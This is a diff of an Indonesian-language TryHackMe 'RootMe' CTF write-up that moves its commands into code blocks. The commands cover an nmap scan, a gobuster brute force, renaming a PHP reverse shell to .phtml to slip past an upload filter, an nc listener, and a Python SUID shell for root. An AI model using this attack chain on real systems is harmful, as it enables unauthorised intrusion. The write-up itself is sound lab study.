@@ -3,11 +3,17 @@
 - IP Machine: 10.10.213.79
 
 ## Task 2 Reconnaissance
-- Lakukan scanning menggunakan tool nmap dengan perintah: `nmap -sV -sC <IP Machine>`
+- Lakukan scanning menggunakan tool `nmap`
+```sh
+nmap -sV -sC <IP Machine>
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%201.JPG)
 
-- Lakukan web directory brute force menggunakan tool gobuster dengan perintah: `gobuster dir -u http://<IP Machine> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
+- Lakukan pencarian halaman web tersembunyi dengan tool `gobuster`
+```sh
+gobuster dir -u http://<IP Machine> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%202.JPG)
 
@@ -51,7 +57,10 @@ ssh
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%205.JPG)
 
-- Sekarang kita coba ubah ekstensi **.php** menjadi **.phtml** dengan perintah `mv php-reverse-shell.php php-reverse-shell.phtml`
+- Sekarang kita coba ubah ekstensi **.php** menjadi **.phtml**
+```sh
+mv php-reverse-shell.php php-reverse-shell.phtml
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%206.JPG)
 
@@ -60,7 +69,10 @@ ssh
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%207.JPG)
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%208.JPG)
 
-- Buka terminal dan jalankan netcat dengan perintah `nc -lnvp <port>`
+- Buka terminal baru dan buat listener netcat di port 4444 sesuai konfigurasi file **php-reverse-shell.php** diatas
+```sh
+nc -lnvp 4444
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%209.JPG)
 
@@ -82,13 +94,19 @@ export TERM=xterm
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%2012.JPG)
 
-- File **user.txt** tidak ditemukan di home directory, jadi kita mencari di directory lain dengan perintah `find / -type f -name user.txt`. Ternyata file **user.txt** berada di path **/var/www/user.txt**
+- File **user.txt** tidak ditemukan di home directory, jadi kita mencari di directory lain dengan perintah dibawah ini. Ternyata file **user.txt** berada di path **/var/www/user.txt**
+```sh
+find / -type f -name user.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%2013.JPG)
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%2014.JPG)
 
-- Buka file **user.txt** dengan perintah `cat <path>`
+- Buka isi file **user.txt**
+```sh
+cat /var/www/user.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%2015.JPG)
 
@@ -116,7 +134,10 @@ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%2018.JPG)
 
-- Sekarang kita tinggal membaca file **root.txt** sebagai root flag dengan perintah `cat /root/root.txt`
+- Buka root flag yang berada di di direktori **/root**
+```sh
+cat /root/root.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/RootMe/assets/rm%2019.JPG)
 
